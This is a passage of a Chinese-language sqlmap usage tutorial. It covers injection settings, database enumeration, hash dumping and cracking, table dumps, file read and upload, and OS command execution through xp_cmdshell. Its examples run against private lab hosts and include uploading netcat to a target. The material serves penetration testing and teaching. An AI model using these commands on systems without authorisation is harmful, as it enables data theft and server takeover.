<p>这个参数不仅影响使用哪些<code>payload</code>同时也会影响测试的注入点，GET和POST的数据都会测试，<code>HTTP Cookie</code>在level为2的时候就会测试，<code>HTTP User-Agent/Referer</code>头在<code>level</code>为3的时候就会测试。</p>
<p>总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</p>
<h5 id="风险等级"><a href="#风险等级" class="headerlink" title="风险等级"></a>风险等级</h5><p><code>--risk</code></p>
<p>共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p>
<p>在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p>
<p>测试的语句同样可以在<code>xml/payloads.xml</code>中找到，你也可以自行添加payload。</p>
<h5 id="页面比较"><a href="#页面比较" class="headerlink" title="页面比较"></a>页面比较</h5><p><code>--string,--not-string,--regexp,--code</code></p>
<blockquote>
<p>默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用–string参数添加字符串，–regexp添加正则），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（–not-string添加）。用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数–code=200。</p>
</blockquote>
<p><code>--text-only,--titles</code></p>
<blockquote>
<p>有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用–text-only（HTTP响应体中不同）–titles（HTML的title标签中不同）。</p>
</blockquote>
<h4 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h4><h5 id="测试是否是注入"><a href="#测试是否是注入" class="headerlink" title="测试是否是注入"></a>测试是否是注入</h5><p><code>--technique</code><br>这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。所有支持的注入方式如下：</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">B: </span><span class="keyword">Boolean-based </span><span class="keyword">blind </span>SQL injection（布尔型注入）</div><div class="line">E: Error-<span class="keyword">based </span>SQL injection（报错型注入）</div><div class="line">U: UNION query SQL injection（可联合查询注入）</div><div class="line">S: Stacked queries SQL injection（可多语句查询注入）</div><div class="line">T: Time-<span class="keyword">based </span><span class="keyword">blind </span>SQL injection（基于时间延迟注入）</div></pre></td></tr></table></figure>
<h5 id="设定延迟注入的时间"><a href="#设定延迟注入的时间" class="headerlink" title="设定延迟注入的时间"></a>设定延迟注入的时间</h5><p><code>--time-sec</code><br>当使用继续时间的盲注时，时刻使用<code>--time-sec</code>参数设定延时时间，默认是5秒。</p>
<h5 id="设定UNION查询字段数"><a href="#设定UNION查询字段数" class="headerlink" title="设定UNION查询字段数"></a>设定UNION查询字段数</h5><p><code>--union-cols</code><br>默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当<code>--level</code>为5的时候他会增加测试到50个字段数。设定<code>--union-cols</code>的值应该是一段整数，如：12-16，是测试12-16个字段数。</p>
<h5 id="设定UNION查询使用的字符"><a href="#设定UNION查询使用的字符" class="headerlink" title="设定UNION查询使用的字符"></a>设定UNION查询使用的字符</h5><p><code>--union-char</code><br>默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，这是你可以用<code>--union-char</code>只定UNION查询的字符。</p>
<h5 id="二阶SQL注入"><a href="#二阶SQL注入" class="headerlink" title="二阶SQL注入"></a>二阶SQL注入</h5><p><code>--second-order</code></p>
<p>有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。–second-order后面跟一个判断页面的URL地址。</p>
<h4 id="枚举数据"><a href="#枚举数据" class="headerlink" title="枚举数据"></a>枚举数据</h4><h5 id="标志"><a href="#标志" class="headerlink" title="标志"></a>标志</h5><p><code>-b,--banner</code><br>大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是<code>version()</code>或者变量<code>@@version</code>这主要取决与是什么数据库。</p>
<h5 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h5><p><code>-current-user</code></p>
<p>在大多数据库中可以获取到管理数据的用户。</p>
<h5 id="当前数据库"><a href="#当前数据库" class="headerlink" title="当前数据库"></a>当前数据库</h5><p><code>--current-db</code></p>
<p>返还当前连接的数据库。</p>
<h5 id="列数据库管理用户"><a href="#列数据库管理用户" class="headerlink" title="列数据库管理用户"></a>列数据库管理用户</h5><p><code>--users</code></p>
<p>当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。</p>
<h5 id="列出并破解数据库用户的hash"><a href="#列出并破解数据库用户的hash" class="headerlink" title="列出并破解数据库用户的hash"></a>列出并破解数据库用户的hash</h5><p><code>--passwords</code></p>
<p>当前用户有权限读取包含用户密码的表的权限时，<code>sqlmap</code>会现列举出用户，然后列出hash，并尝试破解。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" <span class="comment">--passwords -v 1</span></div><div class="line">[...]</div><div class="line">back-<span class="keyword">end</span> DBMS: PostgreSQL</div><div class="line">[hh:mm:<span class="number">38</span>] [INFO] fetching <span class="keyword">database</span> <span class="keyword">users</span> <span class="keyword">password</span> hashes</div><div class="line"><span class="keyword">do</span> you want <span class="keyword">to</span> <span class="keyword">use</span> dictionary attack <span class="keyword">on</span> retrieved <span class="keyword">password</span> hashes? [Y/n/q] y</div><div class="line">[hh:mm:<span class="number">42</span>] [INFO] <span class="keyword">using</span> <span class="keyword">hash</span> method: <span class="string">'postgres_passwd'</span></div><div class="line">what<span class="string">'s the dictionary'</span>s location? [/software/sqlmap/txt/wordlist.txt]</div><div class="line">[hh:mm:<span class="number">46</span>] [INFO] loading dictionary <span class="keyword">from</span>: <span class="string">'/software/sqlmap/txt/wordlist.txt'</span></div><div class="line"><span class="keyword">do</span> you want <span class="keyword">to</span> <span class="keyword">use</span> common <span class="keyword">password</span> suffixes? (slow!) [y/N] n</div><div class="line">[hh:mm:<span class="number">48</span>] [INFO] <span class="keyword">starting</span> dictionary attack (postgres_passwd)</div><div class="line">[hh:mm:<span class="number">49</span>] [INFO] <span class="keyword">found</span>: <span class="string">'testpass'</span> <span class="keyword">for</span> <span class="keyword">user</span>: <span class="string">'testuser'</span></div><div class="line">[hh:mm:<span class="number">50</span>] [INFO] <span class="keyword">found</span>: <span class="string">'testpass'</span> <span class="keyword">for</span> <span class="keyword">user</span>: <span class="string">'postgres'</span></div><div class="line"><span class="keyword">database</span> <span class="keyword">management</span> <span class="keyword">system</span> <span class="keyword">users</span> <span class="keyword">password</span> hashes:</div><div class="line">[*] postgres [<span class="number">1</span>]:</div><div class="line">    <span class="keyword">password</span> <span class="keyword">hash</span>: md5d7d880f96044b72d0bba108ace96d1e4</div><div class="line">    <span class="keyword">clear</span>-<span class="built_in">text</span> <span class="keyword">password</span>: testpass</div><div class="line">[*] testuser [<span class="number">1</span>]:</div><div class="line">    <span class="keyword">password</span> <span class="keyword">hash</span>: md599e5ea7a6f7c3269995cba3927fd0093</div><div class="line">    <span class="keyword">clear</span>-<span class="built_in">text</span> <span class="keyword">password</span>: testpass</div></pre></td></tr></table></figure>
<h5 id="列出数据库管理员权限"><a href="#列出数据库管理员权限" class="headerlink" title="列出数据库管理员权限"></a>列出数据库管理员权限</h5><p><code>--privileges</code></p>
<p>当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。也可以用-U参数指定你想看哪个用户的权限。</p>
<h5 id="列举数据库表"><a href="#列举数据库表" class="headerlink" title="列举数据库表"></a>列举数据库表</h5><p><code>--tables,--exclude-sysdbs,-D</code></p>
<p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。</p>
<p>如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。</p>
<p>–exclude-sysdbs参数是指包含了所有的系统数据库。</p>
<p>需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。</p>
<h5 id="列举数据库表中的字段"><a href="#列举数据库表中的字段" class="headerlink" title="列举数据库表中的字段"></a>列举数据库表中的字段</h5><p><code>--columns,-C,-T,-D</code></p>
<p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。</p>
<p>如果没有使用-D参数指定数据库时，默认会使用当前数据库。</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$ python sqlmap.py -u "http://192.168.136.131/sqlmap/sqlite/get<span class="emphasis">_int.php?id=1" --columns -D testdb -T users -C name</span></div><div class="line">[...]</div><div class="line">Database: SQLite_masterdb</div><div class="line">Table: users</div><div class="line"><span class="meta">[3 columns]</span></div><div class="line"><span class="code">+---------+</span>---------+</div><div class="line"><span class="section">| Column  | Type    |</span></div><div class="line">+---------+---------+</div><div class="line">| id      | INTEGER |</div><div class="line">| name    | TEXT    |</div><div class="line"><span class="section">| surname | TEXT    |</span></div><div class="line">+---------+---------+</div></pre></td></tr></table></figure>
<h5 id="列举数据库系统的架构"><a href="#列举数据库系统的架构" class="headerlink" title="列举数据库系统的架构"></a>列举数据库系统的架构</h5><p><code>--schema,--exclude-sysdbs</code></p>
<p>用户可以用此参数获取数据库的架构，包含所有的数据库，表和字段，以及各自的类型。</p>
<p>加上<code>--exclude-sysdbs</code>参数，将不会获取数据库自带的系统库内容。</p>
<p>例如：</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">$ python sqlmap.py -u <span class="string">"http://192.168.48.130/sqlmap/mysql/get_int.php?id=1"</span> --schema --batch --exclude-sysdbs</div><div class="line">[...]</div><div class="line">Database: owasp10</div><div class="line">Table: accounts</div><div class="line">[4 columns]</div><div class="line">+-------------+---------+</div><div class="line">|<span class="string"> Column      </span>|<span class="string"> Type    </span>|</div><div class="line">+-------------+---------+</div><div class="line">|<span class="string"> cid         </span>|<span class="string"> int(11) </span>|</div><div class="line">|<span class="string"> mysignature </span>|<span class="string"> text    </span>|</div><div class="line">|<span class="string"> password    </span>|<span class="string"> text    </span>|</div><div class="line">|<span class="string"> username    </span>|<span class="string"> text    </span>|</div><div class="line">+-------------+---------+</div><div class="line"></div><div class="line">Database: owasp10</div><div class="line">Table: blogs_table</div><div class="line">[4 columns]</div><div class="line">+--------------+----------+</div><div class="line">|<span class="string"> Column       </span>|<span class="string"> Type     </span>|</div><div class="line">+--------------+----------+</div><div class="line">|<span class="string"> date         </span>|<span class="string"> datetime </span>|</div><div class="line">|<span class="string"> blogger_name </span>|<span class="string"> text     </span>|</div><div class="line">|<span class="string"> cid          </span>|<span class="string"> int(11)  </span>|</div><div class="line">|<span class="string"> comment      </span>|<span class="string"> text     </span>|</div><div class="line">+--------------+----------+</div><div class="line"></div><div class="line">Database: owasp10</div><div class="line">Table: hitlog</div><div class="line">[6 columns]</div><div class="line">+----------+----------+</div><div class="line">|<span class="string"> Column   </span>|<span class="string"> Type     </span>|</div><div class="line">+----------+----------+</div><div class="line">|<span class="string"> date     </span>|<span class="string"> datetime </span>|</div><div class="line">|<span class="string"> browser  </span>|<span class="string"> text     </span>|</div><div class="line">|<span class="string"> cid      </span>|<span class="string"> int(11)  </span>|</div><div class="line">|<span class="string"> hostname </span>|<span class="string"> text     </span>|</div><div class="line">|<span class="string"> ip       </span>|<span class="string"> text     </span>|</div><div class="line">|<span class="string"> referer  </span>|<span class="string"> text     </span>|</div><div class="line">+----------+----------+</div><div class="line"></div><div class="line">Database: testdb</div><div class="line">Table: users</div><div class="line">[3 columns]</div><div class="line">+---------+---------------+</div><div class="line">|<span class="string"> Column  </span>|<span class="string"> Type          </span>|</div><div class="line">+---------+---------------+</div><div class="line">|<span class="string"> id      </span>|<span class="string"> int(11)       </span>|</div><div class="line">|<span class="string"> name    </span>|<span class="string"> varchar(500)  </span>|</div><div class="line">|<span class="string"> surname </span>|<span class="string"> varchar(1000) </span>|</div><div class="line">+---------+---------------+</div><div class="line">[...]</div></pre></td></tr></table></figure>
<h5 id="获取表中数据个数"><a href="#获取表中数据个数" class="headerlink" title="获取表中数据个数"></a>获取表中数据个数</h5><p><code>--count</code></p>
<p>有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$ python sqlmap.py -u <span class="string">"http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1"</span> --count -D testdb</div><div class="line">[...]</div><div class="line">Database: testdb</div><div class="line">+----------------+---------+</div><div class="line">|<span class="string"> Table          </span>|<span class="string"> Entries </span>|</div><div class="line">+----------------+---------+</div><div class="line">|<span class="string"> dbo.users      </span>|<span class="string"> 4       </span>|</div><div class="line">|<span class="string"> dbo.users_blob </span>|<span class="string"> 2       </span>|</div><div class="line">+----------------+---------+</div></pre></td></tr></table></figure>
<h5 id="获取整个表的数据"><a href="#获取整个表的数据" class="headerlink" title="获取整个表的数据"></a>获取整个表的数据</h5><p><code>--dump,-C,-T,-D,--start,--stop,--first,--last</code><br>如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取真个表的所有内容。</p>
<p>使用-D,-T参数指定想要获取哪个库的哪个表，不适用-D参数时，默认使用当前库。</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">$ python sqlmap.py -u <span class="string">"http://192.168.136.131/sqlmap/firebird/get_int.php?id=1"</span> --dump -T users</div><div class="line">[...]</div><div class="line">Database: Firebird_masterdb</div><div class="line">Table: USERS</div><div class="line">[4 entries]</div><div class="line">+----+--------+------------+</div><div class="line">|<span class="string"> ID </span>|<span class="string"> NAME   </span>|<span class="string"> SURNAME    </span>|</div><div class="line">+----+--------+------------+</div><div class="line">|<span class="string"> 1  </span>|<span class="string"> luther </span>|<span class="string"> blisset    </span>|</div><div class="line">|<span class="string"> 2  </span>|<span class="string"> fluffy </span>|<span class="string"> bunny      </span>|</div><div class="line">|<span class="string"> 3  </span>|<span class="string"> wu     </span>|<span class="string"> ming       </span>|</div><div class="line">|<span class="string"> 4  </span>|<span class="string"> NULL   </span>|<span class="string"> nameisnull </span>|</div><div class="line">+----+--------+------------+</div></pre></td></tr></table></figure>
<p>可以获取指定库中的所有表的内容，只用<code>-dump</code>跟<code>-D</code>参数（不使用-T与-C参数）。</p>
<p>也可以用<code>-dump</code>跟<code>-C</code>获取指定的字段内容。</p>
<p>sqlmap为每个表生成了一个CSV文件。</p>
<p>如果你只想获取一段数据，可以使用–start和–stop参数，例如，你只想获取第一段数据可hi使用–stop 1，如果想获取第二段与第三段数据，使用参数 –start 1 –stop 3。</p>
<p>也可以用–first与–last参数，获取第几个字符到第几个字符的内容，如果你想获取字段中地三个字符到第五个字符的内容，使用–first 3 –last 5，只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。</p>
<h5 id="运行自定义的SQL语句"><a href="#运行自定义的SQL语句" class="headerlink" title="运行自定义的SQL语句"></a>运行自定义的SQL语句</h5><p><code>--sql-query,--sql-shell</code></p>
<p>sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。</p>
<p>如果是SELECT查询语句，sqlap将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" <span class="comment">--sql-query "SELECT 'foo'" -v 1</span></div><div class="line"></div><div class="line">[...]</div><div class="line">[hh:mm:14] [INFO] fetching SQL <span class="keyword">SELECT</span> <span class="keyword">query</span> <span class="keyword">output</span>: <span class="string">'SELECT '</span>foo<span class="string">''</span></div><div class="line">[hh:mm:<span class="number">14</span>] [INFO] retrieved: foo</div><div class="line"><span class="keyword">SELECT</span> <span class="string">'foo'</span>:    <span class="string">'foo'</span></div><div class="line"></div><div class="line">$ python sqlmap.py -u <span class="string">"http://192.168.136.131/sqlmap/mssql/get_int.php?id=1"</span> <span class="comment">--sql-query "SELECT 'foo', 'bar'" -v 2</span></div><div class="line"></div><div class="line">[...]</div><div class="line">[hh:mm:<span class="number">50</span>] [INFO] fetching <span class="keyword">SQL</span> <span class="keyword">SELECT</span> <span class="keyword">query</span> <span class="keyword">output</span>: <span class="string">'SELECT '</span>foo<span class="string">', '</span>bar<span class="string">''</span></div><div class="line">[hh:mm:<span class="number">50</span>] [INFO] the <span class="keyword">SQL</span> <span class="keyword">query</span> provided has more <span class="keyword">than</span> a field. sqlmap will <span class="keyword">now</span> unpack it <span class="keyword">into</span></div><div class="line"><span class="keyword">distinct</span> queries <span class="keyword">to</span> be able <span class="keyword">to</span> retrieve the <span class="keyword">output</span> even <span class="keyword">if</span> we <span class="keyword">are</span> going blind</div><div class="line">[hh:mm:<span class="number">50</span>] [DEBUG] <span class="keyword">query</span>: <span class="keyword">SELECT</span> <span class="keyword">ISNULL</span>(<span class="keyword">CAST</span>((<span class="built_in">CHAR</span>(<span class="number">102</span>)+<span class="built_in">CHAR</span>(<span class="number">111</span>)+<span class="built_in">CHAR</span>(<span class="number">111</span>)) <span class="keyword">AS</span> <span class="built_in">VARCHAR</span>(<span class="number">8000</span>)),</div><div class="line">(<span class="built_in">CHAR</span>(<span class="number">32</span>)))</div><div class="line">[hh:mm:<span class="number">50</span>] [INFO] retrieved: foo</div><div class="line">[hh:mm:<span class="number">50</span>] [DEBUG] performed <span class="number">27</span> queries <span class="keyword">in</span> <span class="number">0</span> seconds</div><div class="line">[hh:mm:<span class="number">50</span>] [DEBUG] <span class="keyword">query</span>: <span class="keyword">SELECT</span> <span class="keyword">ISNULL</span>(<span class="keyword">CAST</span>((<span class="built_in">CHAR</span>(<span class="number">98</span>)+<span class="built_in">CHAR</span>(<span class="number">97</span>)+<span class="built_in">CHAR</span>(<span class="number">114</span>)) <span class="keyword">AS</span> <span class="built_in">VARCHAR</span>(<span class="number">8000</span>)),</div><div class="line">(<span class="built_in">CHAR</span>(<span class="number">32</span>)))</div><div class="line">[hh:mm:<span class="number">50</span>] [INFO] retrieved: bar</div><div class="line">[hh:mm:<span class="number">50</span>] [DEBUG] performed <span class="number">27</span> queries <span class="keyword">in</span> <span class="number">0</span> seconds</div><div class="line"><span class="keyword">SELECT</span> <span class="string">'foo'</span>, <span class="string">'bar'</span>:    <span class="string">'foo, bar'</span></div></pre></td></tr></table></figure>
<h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><h5 id="暴力破解表名"><a href="#暴力破解表名" class="headerlink" title="暴力破解表名"></a>暴力破解表名</h5><p><code>--common-tables</code></p>
<p>当使用–tables无法获取到数据库的表时，可以使用此参数。<br>原因一般是：</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>、MySQL数据库版本小于<span class="number">5.0</span>，没有information_schema表。</div><div class="line"><span class="number">2</span>、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。</div><div class="line"><span class="number">3</span>、当前用户没有权限读取系统中保存数据结构的表的权限。</div></pre></td></tr></table></figure>
<h5 id="暴力破解列名"><a href="#暴力破解列名" class="headerlink" title="暴力破解列名"></a>暴力破解列名</h5><p><code>--common-columns</code></p>
<p>与暴力破解表名一样，暴力跑的列名在txt/common-columns.txt中。</p>
<h4 id="系统文件操作"><a href="#系统文件操作" class="headerlink" title="系统文件操作"></a>系统文件操作</h4><h5 id="从数据库服务器中读取文件"><a href="#从数据库服务器中读取文件" class="headerlink" title="从数据库服务器中读取文件"></a>从数据库服务器中读取文件</h5><p><code>--file-read</code></p>
<p>当数据库为<code>MySQL</code>，<code>PostgreSQL</code>或<code>Microsoft SQL Server</code>，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$ <span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther"</span> \</div><div class="line">--<span class="keyword">file</span>-<span class="keyword">read</span> <span class="string">"C:/example.exe"</span> -v <span class="number">1</span></div><div class="line"></div><div class="line">[...]</div><div class="line">[hh:mm:<span class="number">49</span>] [INFO] the back-end DBMS <span class="keyword">is</span> Microsoft SQL Server</div><div class="line">web server operating <span class="built_in">system</span>: Windows <span class="number">2000</span></div><div class="line">web application technology: ASP.NET, Microsoft IIS <span class="number">6.0</span>, ASP</div><div class="line">back-end DBMS: Microsoft SQL Server <span class="number">2005</span></div><div class="line"></div><div class="line">[hh:mm:<span class="number">50</span>] [INFO] fetching <span class="keyword">file</span>: <span class="string">'C:/example.exe'</span></div><div class="line">[hh:mm:<span class="number">50</span>] [INFO] the SQL query provided returns <span class="number">3</span> entries</div><div class="line">C:/example.<span class="keyword">exe</span> <span class="keyword">file</span> saved <span class="keyword">to</span>:    <span class="string">'/software/sqlmap/output/192.168.136.129/files/C__example.exe'</span></div><div class="line">[...]</div><div class="line"></div><div class="line">$ <span class="keyword">ls</span> -<span class="keyword">l</span> output/<span class="number">192.168</span>.<span class="number">136.129</span>/<span class="keyword">files</span>/C__example.<span class="keyword">exe</span></div><div class="line">-rw-r--r-- <span class="number">1</span> inquis inquis <span class="number">2560</span> <span class="number">2011</span>-MM-DD hh:mm output/<span class="number">192.168</span>.<span class="number">136.129</span>/<span class="keyword">files</span>/C__example.<span class="keyword">exe</span></div><div class="line"></div><div class="line">$ <span class="keyword">file</span> output/<span class="number">192.168</span>.<span class="number">136.129</span>/<span class="keyword">files</span>/C__example.<span class="keyword">exe</span></div><div class="line">output/<span class="number">192.168</span>.<span class="number">136.129</span>/<span class="keyword">files</span>/C__example.<span class="keyword">exe</span>: PE32 <span class="built_in">executable</span> <span class="keyword">for</span> MS Windows (GUI) Intel</div><div class="line"><span class="number">80386</span> <span class="number">32</span>-bit</div></pre></td></tr></table></figure>
<h5 id="把文件上传到数据库服务器中"><a href="#把文件上传到数据库服务器中" class="headerlink" title="把文件上传到数据库服务器中"></a>把文件上传到数据库服务器中</h5><p><code>--file-write,--file-dest</code></p>
<p>当数据库为<code>MySQL</code>，<code>PostgreSQL</code>或<code>Microsoft SQL Server</code>，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">file</span> /software/nc.exe.packed</div><div class="line">/software/nc.exe.packed: PE32 executable <span class="keyword">for</span> MS Windows (console) Intel <span class="number">80386</span> <span class="number">32</span>-bit</div><div class="line"></div><div class="line">$ ls -l /software/nc.exe.packed</div><div class="line">-rwxr-xr-x <span class="number">1</span> inquis inquis <span class="number">31744</span> <span class="number">2009</span>-MM-DD hh:mm /software/nc.exe.packed</div><div class="line"></div><div class="line">$ python sqlmap.py -u <span class="string">"http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1"</span> <span class="comment">--file-write \</span></div><div class="line"><span class="string">"/software/nc.exe.packed"</span> <span class="comment">--file-dest "C:/WINDOWS/Temp/nc.exe" -v 1</span></div><div class="line"></div><div class="line">[...]</div><div class="line">[hh:mm:<span class="number">29</span>] [INFO] <span class="keyword">the</span> <span class="keyword">back</span>-<span class="keyword">end</span> DBMS <span class="keyword">is</span> MySQL</div><div class="line">web server operating system: Windows <span class="number">2003</span> <span class="keyword">or</span> <span class="number">2008</span></div><div class="line">web <span class="built_in">application</span> technology: ASP.NET, Microsoft IIS <span class="number">6.0</span>, ASP.NET <span class="number">2.0</span><span class="number">.50727</span></div><div class="line"><span class="keyword">back</span>-<span class="keyword">end</span> DBMS: MySQL &amp;gt;= <span class="number">5.0</span><span class="number">.0</span></div><div class="line"></div><div class="line">[...]</div><div class="line">do you want confirmation <span class="keyword">that</span> <span class="keyword">the</span> <span class="built_in">file</span> 'C:/WINDOWS/Temp/nc.exe' has been successfully</div><div class="line">written <span class="keyword">on</span> <span class="keyword">the</span> <span class="keyword">back</span>-<span class="keyword">end</span> DBMS <span class="built_in">file</span> system? [Y/n] y</div><div class="line">[hh:mm:<span class="number">52</span>] [INFO] retrieved: <span class="number">31744</span></div><div class="line">[hh:mm:<span class="number">52</span>] [INFO] <span class="keyword">the</span> <span class="built_in">file</span> has been successfully written <span class="keyword">and</span> <span class="keyword">its</span> size <span class="keyword">is</span> <span class="number">31744</span> bytes,</div><div class="line">same size <span class="keyword">as</span> <span class="keyword">the</span> <span class="keyword">local</span> <span class="built_in">file</span> '/software/nc.exe.packed'</div></pre></td></tr></table></figure>
<h5 id="运行任意操作系统命令"><a href="#运行任意操作系统命令" class="headerlink" title="运行任意操作系统命令"></a>运行任意操作系统命令</h5><p><code>--os-cmd,--os-shell</code></p>
<p>当数据库为<code>MySQL</code>，<code>PostgreSQL</code>或<code>Microsoft SQL Server</code>，并且当前用户有权限使用特定的函数。</p>
<p>在<code>MySQL</code>、<code>PostgreSQL</code>，<code>sqlmap</code>上传一个二进制库，包含用户自定义的函数，<code>sys_exec()</code>和sys_eval()`。</p>
<p>那么他创建的这两个函数可以执行系统命令。在<code>Microsoft SQL Server</code>，<code>sqlmap</code>将会使用<code>xp_cmdshell</code>存储过程，如果被禁（在Microsoft SQL Server 2005及以上版本默认禁制），<code>sqlmap</code>会重新启用它，如果不存在，会自动创建。</p>
